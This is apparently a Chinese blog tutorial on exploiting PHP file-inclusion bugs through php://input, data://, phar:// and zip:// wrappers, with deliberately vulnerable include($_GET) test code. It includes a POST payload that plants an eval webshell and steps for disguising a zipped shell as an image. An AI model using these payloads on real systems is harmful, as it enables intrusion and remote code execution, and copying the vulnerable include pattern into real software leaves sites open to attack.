<p>用法：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去。</p>
<h3 id="php-x2F-x2F-input-（读取POST数据）"><a href="#php-x2F-x2F-input-（读取POST数据）" class="headerlink" title="php:&#x2F;&#x2F;input （读取POST数据）"></a>php:&#x2F;&#x2F;input （读取POST数据）</h3><p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
<p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php://input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input（写入木马）"><a href="#php-x2F-x2F-input（写入木马）" class="headerlink" title="php:&#x2F;&#x2F;input（写入木马）"></a>php:&#x2F;&#x2F;input（写入木马）</h3><p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p>
<p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input（命令执行）"><a href="#php-x2F-x2F-input（命令执行）" class="headerlink" title="php:&#x2F;&#x2F;input（命令执行）"></a>php:&#x2F;&#x2F;input（命令执行）</h3><p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
<h3 id="file-x2F-x2F-伪协议-（读取文件内容）"><a href="#file-x2F-x2F-伪协议-（读取文件内容）" class="headerlink" title="file:&#x2F;&#x2F;伪协议 （读取文件内容）"></a>file:&#x2F;&#x2F;伪协议 （读取文件内容）</h3><p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
<p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="data-x2F-x2F-伪协议"><a href="#data-x2F-x2F-伪协议" class="headerlink" title="data:&#x2F;&#x2F;伪协议"></a>data:&#x2F;&#x2F;伪协议</h3><p>数据流封装器，和php:&#x2F;&#x2F;相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data:&#x2F;&#x2F;text&#x2F;plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
<p><strong>data:&#x2F;&#x2F;（读取文件）</strong></p>
<p>和php伪协议的input类似，碰到file_get_contents()来用； <?php // 打印 "I love PHP" echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;闭合;</span><br></pre></td></tr></table></figure>

<p>如果php.ini里的allow_url_include&#x3D;On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h3><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p>
<p>用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意： PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
<p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F;伪协议"></a>zip:&#x2F;&#x2F;伪协议</h3><p>zip伪协议和phar协议类似，但是用法不一样。</p>
<p>用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php。</p>
<p>条件： PHP &gt; &#x3D;5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
<p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
</search>
